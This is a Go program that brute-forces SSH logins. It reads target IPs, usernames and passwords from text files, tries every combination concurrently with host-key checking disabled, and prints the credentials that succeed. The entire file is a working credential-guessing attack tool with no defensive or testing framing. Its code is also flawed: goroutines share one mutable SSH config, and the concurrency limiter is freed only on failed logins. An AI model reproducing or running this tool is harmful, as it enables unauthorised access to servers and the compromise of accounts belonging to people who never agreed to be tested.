package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"os"
	"strings"
	"sync"
	"time"
)

type Info struct {
	IP   string
	Port string
}

type Host struct {
	Host     []Info
	User     []string
	Pass     []string
	fileHost string
	filePass string
	fileuser string
}

func (H *Host) SSHConnectionsStart() {
	var wg sync.WaitGroup
	ch := make(chan int, 40)
	sshconf := &ssh.ClientConfig{
		Timeout:         9 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	for _, host := range H.Host {
		wg.Add(1)
		go func(host Info) {
			defer wg.Done()
			for _, user := range H.User {
				for _, pass := range H.Pass {
                                             ch <- 1
					sshconf.User = user
					sshconf.Auth = []ssh.AuthMethod{ssh.Password(pass)}
					cli, err := ssh.Dial("tcp", host.IP+":"+host.Port, sshconf)
					if err != nil {
						<-ch
						fmt.Println("IP: "+host.IP+" User:"+user+" Pass:"+pass, err)
						continue
					}
					fmt.Println("Good ", cli.ServerVersion(), host.IP+" "+pass)
				}
			}
		}(host)
	}

	wg.Wait()
}

func (H *Host) GetPassAndUsers() {
	pass, err := os.Open(H.filePass)
	if err != nil {
		log.Fatal(err)
		return
	}
	defer pass.Close()

	scanPass := bufio.NewScanner(pass)
	for scanPass.Scan() {
		H.Pass = append(H.Pass, scanPass.Text())
	}
	/////
	user, err := os.Open(H.fileuser)
	if err != nil {
		log.Fatal(err)
		return
	}
	defer user.Close()
	scanUser := bufio.NewScanner(user)
	for scanUser.Scan() {
		H.User = append(H.User, scanUser.Text())
	}

}

func (H *Host) GetIPs() {
	file, err := os.Open(H.fileHost)
	if err != nil {
		log.Fatal(err)
		return
	}
	defer file.Close()
	scan := bufio.NewScanner(file)
	for scan.Scan() {
		var i Info
		if strings.Contains(scan.Text(), ":") {
			sp := strings.Split(scan.Text(), ":")
			i.IP = strings.Replace(sp[0], ":", "", -1)
			i.Port = sp[1]
			H.Host = append(H.Host, i)
			//	fmt.Println(i)
			continue

		} else {
			i.IP = scan.Text()
			i.Port = "22"
			H.Host = append(H.Host, i)
		}

		//fmt.Println(i)
	}
	if err := scan.Err(); err != nil {
		log.Fatal(err)
	}
}

func main() {
	var proc Host
	proc.fileHost = "ips.txt"
	proc.filePass = "pwds.txt"
	proc.fileuser = "users.txt"
	proc.GetIPs()
	proc.GetPassAndUsers()
	proc.SSHConnectionsStart()
}
